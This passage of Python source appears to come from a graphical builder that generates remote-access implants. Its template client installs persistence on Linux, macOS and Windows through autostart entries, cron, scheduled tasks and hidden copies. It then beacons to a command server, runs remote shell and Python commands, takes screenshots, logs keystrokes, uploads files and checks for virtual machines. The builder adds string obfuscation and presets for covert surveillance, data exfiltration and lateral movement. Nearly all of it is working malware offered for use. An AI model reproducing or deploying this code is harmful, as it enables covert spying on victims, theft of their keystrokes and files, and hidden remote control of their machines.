NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
                desktop_file = os.path.join(startup_dir, "c2client.desktop")
                with open(desktop_file, "w") as f:
                    f.write(desktop_entry)
                return True
            elif platform.system() == "Darwin":  # macOS
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.c2client.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{{os.path.abspath(__file__)}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(launch_agents_dir, exist_ok=True)
                plist_file = os.path.join(launch_agents_dir, "com.c2client.agent.plist")
                with open(plist_file, "w") as f:
                    f.write(plist_content)
                
                # Load the agent
                subprocess.run(["launchctl", "load", plist_file], check=False)
                return True
        except Exception as e:
            self.logger.error(f"Startup persistence installation failed: {{e}}")
            return False
    
    def _install_service_persistence(self):
        """Install service persistence on Windows"""
        try:
            # This requires pywin32 - install with: pip install pywin32
            import win32serviceutil
            import win32service
            import win32event
            import servicemanager
            import socket
            
            # Create Windows service code (this is complex and simplified here)
            # A full implementation would require creating a separate Windows service script
            self.logger.info("Windows service persistence requires additional setup")
            return True
        except ImportError:
            self.logger.warning("pywin32 not available for service installation")
            return False
        except Exception as e:
            self.logger.error(f"Service persistence installation failed: {{e}}")
            return False
    
    def _install_cron_persistence(self):
        """Install cron job persistence on Linux"""
        try:
            cron_job = f"*/5 * * * * /usr/bin/python3 {{os.path.abspath(__file__)}}\\n"
            
            # Get current crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add our job if not already present
            if "c2client" not in current_cron:
                new_cron = current_cron + cron_job
                # Write new crontab
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp_file:
                    tmp_file.write(new_cron)
                    tmp_filename = tmp_file.name
                
                subprocess.run(["crontab", tmp_filename])
                os.unlink(tmp_filename)
                
            return True
        except Exception as e:
            self.logger.error(f"Cron persistence installation failed: {{e}}")
            return False
    
    def _install_launch_agent_persistence(self):
        """Install launch agent persistence on macOS"""
        try:
            # Already handled in _install_startup_persistence for macOS
            return True
        except Exception as e:
            self.logger.error(f"Launch agent persistence installation failed: {{e}}")
            return False
    
    def _install_task_scheduler_persistence(self):
        """Install task scheduler persistence on Windows"""
        try:
            # Use schtasks to create a scheduled task
            task_command = f'schtasks /create /tn "C2Client" /tr "{{sys.executable}} {{os.path.abspath(__file__)}}" /sc onlogon /ru "SYSTEM"'
            result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            self.logger.error(f"Task scheduler persistence installation failed: {{e}}")
            return False
    
    def _install_hidden_file_persistence(self):
        """Hide client in system files"""
        try:
            # Choose appropriate location based on OS
            if platform.system() == "Windows":
                dest_path = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "C2Client.exe")
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(sys.executable, dest_path)
                # Make it hidden (Windows)
                subprocess.run(f"attrib +H \\"{{dest_path}}\\"", shell=True)
            elif platform.system() in ["Linux", "Darwin"]:
                dest_path = os.path.join(os.path.expanduser("~"), ".cache", "c2client")
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                shutil.copy2(__file__, dest_path)
                # In Unix systems, files starting with . are hidden
            return True
        except Exception as e:
            self.logger.error(f"Hidden file persistence installation failed: {{e}}")
            return False
    
    def register(self):
        """Register with the C2 server"""
        system_info = self.get_system_info()
        if not system_info:
            return False

        try:
            # Register directly without authentication
            response = self.session.post(
                "{{}}/api/agents/register".format(self.server_url),
                json=system_info
            )

            if response.status_code == 200:
                self.logger.info("Successfully registered as client {{}}".format(self.client_id))
                
                # Install persistence after successful registration
                if self.persistence:
                    self.install_persistence()
                
                return True
            else:
                self.logger.error("Registration failed: {{}}".format(response.text))
                return False
        except Exception as e:
            self.logger.error("Registration error: {{}}".format(e))
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            response = self.session.post(
                "{{}}/api/agents/{{}}/heartbeat".format(self.server_url, self.client_id)
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Heartbeat error: {{}}".format(e))
            return False
    
    def get_commands(self):
        """Get pending commands from server"""
        try:
            response = self.session.get(
                "{{}}/api/commands/{{}}".format(self.server_url, self.client_id)
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("commands", [])
            else:
                return []
        except Exception as e:
            self.logger.error("Error getting commands: {{}}".format(e))
            return []
    
    def execute_command(self, command, command_type="shell"):
        """Execute a command and return result"""
        try:
            if command_type == "shell":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout + result.stderr
                success = result.returncode == 0
                
                return {{
                    "result": output,
                    "success": success,
                    "return_code": result.returncode
                }}
            elif command_type == "python":
                # Execute Python code
                try:
                    exec_globals = {{"__builtins__": __builtins__}}
                    exec_locals = {{}}
                    exec(command, exec_globals, exec_locals)
                    return {{
                        "result": "Python code executed successfully",
                        "success": True,
                        "return_code": 0
                    }}
                except Exception as e:
                    return {{
                        "result": "Python execution error: {{}}".format(str(e)),
                        "success": False,
                        "return_code": 1
                    }}
            else:
                return {{
                    "result": "Unknown command type: {{}}".format(command_type),
                    "success": False,
                    "return_code": 1
                }}
        except subprocess.TimeoutExpired:
            return {{
                "result": "Command timed out",
                "success": False,
                "return_code": 124
            }}
        except Exception as e:
            return {{
                "result": "Error executing command: {{}}".format(str(e)),
                "success": False,
                "return_code": 1
            }}
    
    def take_screenshot(self):
        """Take a screenshot and return base64 encoded image"""
        if not self.capabilities.get("screenshot", False):
            return {{
                "result": "Screenshot capability not enabled",
                "success": False
            }}
            
        try:
            from PIL import ImageGrab
            import io
            
            # Take screenshot
            screenshot = ImageGrab.grab()
            
            # Save to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            
            # Convert to base64
            image_data = base64.b64encode(img_bytes.read()).decode('utf-8')
            
            return {{
                "result": "Screenshot captured successfully",
                "success": True,
                "image_data": image_data,
                "timestamp": datetime.now().isoformat()
            }}
        except ImportError:
            return {{
                "result": "PIL not available. Install with: pip install Pillow",
                "success": False
            }}
        except Exception as e:
            return {{
                "result": "Screenshot error: {{}}".format(str(e)),
                "success": False
            }}
    
    def start_keylogger(self):
        """Start keylogger"""
        if not self.capabilities.get("keylogger", False):
            return {{
                "result": "Keylogger capability not enabled",
                "success": False
            }}
            
        try:
            from pynput import keyboard
        except ImportError:
            return {{
                "result": "Keylogger not available. Install with: pip install pynput",
                "success": False
            }}
        
        if self.keylogger_active:
            return {{
                "result": "Keylogger already active",
                "success": False
            }}
        
        try:
            self.keylogger_active = True
            self.keylogger_thread = threading.Thread(target=self._keylogger_worker)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
            
            return {{
                "result": "Keylogger started",
                "success": True
            }}
        except Exception as e:
            return {{
                "result": "Keylogger start error: {{}}".format(str(e)),
                "success": False
            }}
    
    def stop_keylogger(self):
        """Stop keylogger"""
        if not self.capabilities.get("keylogger", False):
            return {{
                "result": "Keylogger capability not enabled",
                "success": False
            }}
            
        if not self.keylogger_active:
            return {{
                "result": "Keylogger not active",
                "success": False
            }}
        
        try:
            self.keylogger_active = False
            if self.keylogger_thread:
                self.keylogger_thread.join(timeout=1)
            
            return {{
                "result": "Keylogger stopped",
                "success": True,
                "logged_keys": len(self.logged_keys)
            }}
        except Exception as e:
            return {{
                "result": "Keylogger stop error: {{}}".format(str(e)),
                "success": False
            }}
    
    def _keylogger_worker(self):
        """Keylogger worker thread"""
        try:
            from pynput import keyboard
        except ImportError:
            return
            
        def on_press(key):
            if self.keylogger_active:
                try:
                    key_str = str(key).replace("'", "")
                    self.logged_keys.append({{
                        "key": key_str,
                        "timestamp": datetime.now().isoformat()
                    }})
                except Exception:
                    pass
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    
    def get_keylog_data(self):
        """Get keylog data"""
        if not self.capabilities.get("keylogger", False):
            return {{
                "result": "Keylogger capability not enabled",
                "success": False
            }}
            
        return {{
            "result": "Keylog data retrieved",
            "success": True,
            "keys": self.logged_keys,
            "count": len(self.logged_keys)
        }}
    
    def upload_file(self, file_path):
        """Upload a file to the server"""
        try:
            if not self.capabilities.get("file_exfiltration", False):
                return {{
                    "result": "File exfiltration capability not enabled",
                    "success": False
                }}
                
            if not os.path.exists(file_path):
                return {{
                    "result": "File not found: {{}}".format(file_path),
                    "success": False
                }}
            
            with open(file_path, "rb") as f:
                files = {{"file": f}}
                response = self.session.post(
                    "{{}}/api/files/upload".format(self.server_url),
                    files=files
                )
            
            if response.status_code == 200:
                return {{
                    "result": "File uploaded successfully",
                    "success": True,
                    "filename": os.path.basename(file_path)
                }}
            else:
                return {{
                    "result": "Upload failed: {{}}".format(response.text),
                    "success": False
                }}
        except Exception as e:
            return {{
                "result": "Upload error: {{}}".format(str(e)),
                "success": False
            }}
    
    def download_file(self, filename, save_path=None):
        """Download a file from the server"""
        try:
            if not save_path:
                save_path = os.path.join(self.temp_dir, filename)
            
            response = self.session.get(
                "{{}}/api/files/download/{{}}".format(self.server_url, filename)
            )
            
            if response.status_code == 200:
                with open(save_path, "wb") as f:
                    f.write(response.content)
                
                return {{
                    "result": "File downloaded successfully",
                    "success": True,
                    "path": save_path
                }}
            else:
                return {{
                    "result": "Download failed: {{}}".format(response.text),
                    "success": False
                }}
        except Exception as e:
            return {{
                "result": "Download error: {{}}".format(str(e)),
                "success": False
            }}
    
    def submit_result(self, command_id, result, success, additional_data=None):
        """Submit command result to server"""
        try:
            result_data = {{
                "agent_id": self.client_id,
                "command_id": command_id,
                "result": result,
                "success": success,
                "timestamp": datetime.utcnow().isoformat()
            }}
            
            if additional_data:
                result_data.update(additional_data)

            # Encrypt sensitive data if encryption is enabled
            if self.encryption != "None":
                for key in ["result", "additional_data"]:
                    if key in result_data:
                        result_data[key] = self.encrypt_data(str(result_data[key]))

            response = self.session.post(
                "{{}}/api/commands/result".format(self.server_url),
                json=result_data
            )
            
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Error submitting result: {{}}".format(e))
            return False
    
    def process_commands(self):
        """Process pending commands"""
        commands = self.get_commands()
        
        for cmd in commands:
            if cmd.get("status") == "pending":
                self.logger.info("Executing command: {{}}".format(cmd['command']))
                
                command_type = cmd.get("command_type", "shell")
                command_text = cmd['command']
                
                # Handle special commands based on capabilities
                if command_text.startswith("SCREENSHOT") and self.capabilities.get("screenshot", False):
                    result_data = self.take_screenshot()
                elif command_text.startswith("KEYLOG_START") and self.capabilities.get("keylogger", False):
                    result_data = self.start_keylogger()
                elif command_text.startswith("KEYLOG_STOP") and self.capabilities.get("keylogger", False):
                    result_data = self.stop_keylogger()
                elif command_text.startswith("KEYLOG_DATA") and self.capabilities.get("keylogger", False):
                    result_data = self.get_keylog_data()
                elif command_text.startswith("UPLOAD") and self.capabilities.get("file_exfiltration", False):
                    file_path = command_text.split(" ", 1)[1] if " " in command_text else ""
                    result_data = self.upload_file(file_path)
                elif command_text.startswith("DOWNLOAD") and self.capabilities.get("file_exfiltration", False):
                    filename = command_text.split(" ", 1)[1] if " " in command_text else ""
                    result_data = self.download_file(filename)
                elif command_text.startswith("LOGS"):
                    parts = command_text.split()
                    log_type = parts[1] if len(parts) > 1 else "system"
                    lines = int(parts[2]) if len(parts) > 2 else 100
                    result_data = {{"result": "Log command not implemented", "success": False}}
                elif command_text.startswith("PROCESSES"):
                    result_data = {{"result": "Processes command not implemented", "success": False}}
                elif command_text.startswith("NETWORK"):
                    result_data = {{"result": "Network command not implemented", "success": False}}
                else:
                    result_data = self.execute_command(command_text, command_type)
                
                self.submit_result(
                    cmd["command_id"],
                    result_data["result"],
                    result_data["success"],
                    result_data
                )
                
                self.logger.info("Command result: {{}}".format(result_data['success']))
    
    def cleanup(self):
        """Cleanup resources"""
        try:
            if self.keylogger_active:
                self.stop_keylogger()
            
            # Clean up temp directory
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            
            self.logger.info("Client cleanup completed")
        except Exception as e:
            self.logger.error("Cleanup error: {{}}".format(e))
    
    def run(self):
        """Main client loop"""
        self.logger.info("Starting Advanced C2 Client {{}}".format(self.client_id))
        
        # Check for VM evasion
        if self.check_vm_evasion():
            return
        
        # Register with server
        if not self.register():
            self.logger.error("Failed to register with server. Exiting.")
            return
        
        self.running = True
        
        # Setup signal handlers for graceful shutdown
        import signal
        def signal_handler(signum, frame):
            self.logger.info("Received signal {{}}, shutting down...".format(signum))
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            while self.running:
                # Send heartbeat
                self.send_heartbeat()
                
                # Process commands
                self.process_commands()
                
                # Wait before next iteration (using beacon interval)
                time.sleep(self.beacon_interval)
                
        except KeyboardInterrupt:
            self.logger.info("Client stopped by user")
        except Exception as e:
            self.logger.error("Client error: {{}}".format(e))
        finally:
            self.running = False
            self.cleanup()

def main():
    # Initialize advanced C2 client with comprehensive configuration
    client = AdvancedC2Client(
        server_url="{server_url}",
        client_id="{client_id}",
        display_name="{display_name}",
        beacon_interval={beacon_interval},
        stealth_mode={stealth},
        hide_console={hide_console},
        disable_logging={disable_logging},
        anti_vm_evasion={anti_vm},
        capabilities={capabilities},
        persistence={persistence},
        encryption="{encryption}",
        encryption_key="{encryption_key}",
        proxy_host={proxy_host},
        proxy_port={proxy_port},
        user_agent="{user_agent}"
    )
    
    # Start the C2 client
    try:
        client.run()
    except KeyboardInterrupt:
        print("\\nClient terminated by user")
        sys.exit(0)
    except Exception as e:
        print("Client error: {{}}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
'''

        # Apply obfuscation if requested
        if obfuscation:
            client_script = ClientBuilderWindow._apply_obfuscation(client_script)
        
        return client_script
    
    @staticmethod
    def _apply_obfuscation(code: str) -> str:
        """Apply basic obfuscation to the code (this is a simplified implementation)"""
        import re
        
        # String encryption: simple XOR obfuscation
        def obfuscate_string(match):
            original = match.group(1)
            # Simple XOR obfuscation with a key
            key = 42  # Simple key, in practice this should be more complex
            encoded = [ord(c) ^ key for c in original]
            encoded_str = ','.join(map(str, encoded))
            return f'"".join(chr(x ^ {key}) for x in [{encoded_str}])'
        
        # Obfuscate string literals
        code = re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', obfuscate_string, code)
        
        # Variable name obfuscation (simplified)
        # This is a basic version - in practice, this would be more complex
        replacements = {
            'client': 'a',
            'server_url': 'b',
            'client_id': 'c',
            'stealth_mode': 'd',
            'beacon_interval': 'e'
        }
        
        for old, new in replacements.items():
            # Only replace when it's a complete word
            code = re.sub(r'\b' + old + r'\b', new, code)
        
        return code

    def _apply_preset(self):
        """Apply configuration preset based on selection"""
        preset_name = self.preset_combo.currentText()
        
        if preset_name == "Select a preset...":
            self._set_status("Please select a preset to apply", error=True)
            return
        
        # Preset configurations
        PRESETS = {
            "Covert Surveillance": {
                "capabilities": {
                    "screenshot": True,
                    "keylogger": True,
                    "webcam": True,
                    "microphone": True,
                },
                "persistence": {
                    "startup": True,
                    "hidden_file": True,
                },
                "stealth": True,
                "beacon_interval": 60,
                "encryption": "AES-256",
                "output_format": "Executable (PyInstaller)"
            },
            "Data Exfiltration": {
                "capabilities": {
                    "file_exfiltration": True,
                    "screenshot": True,
                    "process_injection": True,
                },
                "persistence": {
                    "cron": True,
                    "startup": True,
                },
                "stealth": True,
                "disable_logging": True,
                "beacon_interval": 45,
                "encryption": "ChaCha20",
                "output_format": "Python Script"
            },
            "Lateral Movement": {
                "capabilities": {
                    "privilege_escalation": True,
                    "process_injection": True,
                    "uac_bypass": True,
                    "network": True,
                },
                "persistence": {
                    "task_scheduler": True,
                    "startup": True,
                },
                "stealth": True,
                "anti_vm": True,
                "beacon_interval": 90,
                "encryption": "AES-256",
                "output_format": "EXE (C++)"
            },
            "Minimal Recon": {
                "capabilities": {
                    "screenshot": True,
                    "processes": True,
                    "network": True,
                },
                "persistence": {},
                "stealth": True,
                "beacon_interval": 120,
                "encryption": "None",
                "output_format": "Python Script"
            }
        }
        
        preset = PRESETS.get(preset_name)
        if not preset:
            self._set_status(f"Preset {preset_name} not found", error=True)
            return
        
        # Apply the preset configuration
        # Capabilities
        caps = preset.get("capabilities", {})
        self.screenshot_checkbox.setChecked(caps.get("screenshot", False))
        self.keylogger_checkbox.setChecked(caps.get("keylogger", False))
        self.file_exfiltration_checkbox.setChecked(caps.get("file_exfiltration", False))
        self.webcam_checkbox.setChecked(caps.get("webcam", False))
        self.microphone_checkbox.setChecked(caps.get("microphone", False))
        self.privilege_escalation_checkbox.setChecked(caps.get("privilege_escalation", False))
        self.process_injection_checkbox.setChecked(caps.get("process_injection", False))
        self.uac_bypass_checkbox.setChecked(caps.get("uac_bypass", False))
        self.dns_tunneling_checkbox.setChecked(caps.get("dns_tunneling", False))
        
        # Persistence
        persist = preset.get("persistence", {})
        self.startup_checkbox.setChecked(persist.get("startup", False))
        self.service_checkbox.setChecked(persist.get("service", False))
        self.cron_checkbox.setChecked(persist.get("cron", False))
        self.launch_agent_checkbox.setChecked(persist.get("launch_agent", False))
        self.task_scheduler_checkbox.setChecked(persist.get("task_scheduler", False))
        self.hidden_file_checkbox.setChecked(persist.get("hidden_file", False))
        
        # Basic settings
        self.stealth_checkbox.setChecked(preset.get("stealth", False))
        self.disable_logging_checkbox.setChecked(preset.get("disable_logging", False))
        self.anti_vm_checkbox.setChecked(preset.get("anti_vm", False))
        self.beacon_interval_spin.setValue(preset.get("beacon_interval", 30))
        
        # Encryption
        encryption = preset.get("encryption", "None")
        index = self.encryption_combo.findText(encryption)
        if index >= 0:
            self.encryption_combo.setCurrentIndex(index)
        
        # Output format
        output_format = preset.get("output_format", "Python Script")
        index = self.output_format_combo.findText(output_format)
        if index >= 0:
            self.output_format_combo.setCurrentIndex(index)
        
        self._set_status(f"Applied preset: {preset_name}")

    def _update_command_preview(self):
        """Update the command line preview based on current settings"""
        client_info = self.client_type_combo.currentData()
        client_meta = SUPPORTED_CLIENTS[self.client_type_combo.currentText().split(' ', 1)[1]]  # Extract the actual client name

        # Get protocol and build server URL
        protocol = self.protocol_combo.currentText().lower()
        ip = self.ip_edit.text().strip()
        port = int(self.port_edit.text().strip())
        server_url = "{}://{}:{}".format(protocol, ip, port)

        # Client configuration
        client_id = self.client_id_edit.text().strip() or ""
        display_name = self.display_name_edit.text().strip() or ""
        beacon_interval = self.beacon_interval_spin.value()
        stealth = self.stealth_checkbox.isChecked()
        disable_logging = self.disable_logging_checkbox.isChecked()
        anti_vm = self.anti_vm_checkbox.isChecked()
        encryption = self.encryption_combo.currentText()
        encryption_key = self.encryption_key_edit.text().strip()
        
        # Build command based on selected format
        cmd_format = self.cmd_format_combo.currentText()
        include_deps = self.include_deps_checkbox.isChecked()
        
        if cmd_format == "Python":
            cmd = f"python3 -c \""
            cmd += f"from {client_meta['module']} import {client_meta['class']}; "
            cmd += f"client = {client_meta['class']}(server_url='{server_url}'"
            if client_id:
                cmd += f", client_id='{client_id}'"
            if display_name:
                cmd += f", display_name='{display_name}'"
            cmd += f", beacon_interval={beacon_interval}"
            if stealth:
                cmd += ", stealth_mode=True"
            if disable_logging:
                cmd += ", disable_logging=True"
            if anti_vm:
                cmd += ", anti_vm_evasion=True"
            if encryption != "None":
                cmd += f", encryption='{encryption}'"
                if encryption_key:
                    cmd += f", encryption_key='{encryption_key}'"
            cmd += "); client.run()\""
        elif cmd_format == "Windows Batch":
            cmd = f"python -c \"from {client_meta['module']} import {client_meta['class']}; "
            cmd += f"client = {client_meta['class']}(server_url='{server_url}'"
            if client_id:
                cmd += f", client_id='{client_id}'"
            if display_name:
                cmd += f", display_name='{display_name}'"
            cmd += f", beacon_interval={beacon_interval}"
            if stealth:
                cmd += ", stealth_mode=True"
            if disable_logging:
                cmd += ", disable_logging=True"
            if anti_vm:
                cmd += ", anti_vm_evasion=True"
            if encryption != "None":
                cmd += f", encryption='{encryption}'"
                if encryption_key:
                    cmd += f", encryption_key='{encryption_key}'"
            cmd += "); client.run()\""
        elif cmd_format == "Linux Shell":
            cmd = f"python3 -c \"from {client_meta['module']} import {client_meta['class']}; "
            cmd += f"client = {client_meta['class']}(server_url='{server_url}'"
            if client_id:
                cmd += f", client_id='{client_id}'"
            if display_name:
                cmd += f", display_name='{display_name}'"
            cmd += f", beacon_interval={beacon_interval}"
            if stealth:
                cmd += ", stealth_mode=True"
            if disable_logging:
                cmd += ", disable_logging=True"
            if anti_vm:
                cmd += ", anti_vm_evasion=True"
            if encryption != "None":
                cmd += f", encryption='{encryption}'"
                if encryption_key:
                    cmd += f", encryption_key='{encryption_key}'"
            cmd += "); client.run()\""
        else:  # PyInstaller or default
            # Assuming client script is already generated
            script_name = f"generated_client_{client_meta['filename_prefix']}"
            if client_id:
                script_name += f"_{client_id}"
            else:
                script_name += f"_{time.strftime('%Y%m%d_%H%M%S')}"
            script_name += ".py"
            cmd = f"python {script_name}"

        self.cmd_preview_text.setText(cmd)

    def _set_status(self, message: str, error: bool = False):
        palette = self.status_label.palette()
        color = QtCore.Qt.red if error else QtCore.Qt.darkGreen
        palette.setColor(self.status_label.foregroundRole(), color)
        self.status_label.setPalette(palette)
        self.status_label.setText(message)


def main():
    app = QtWidgets.QApplication(sys.argv)
    w = ClientBuilderWindow()
    w.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()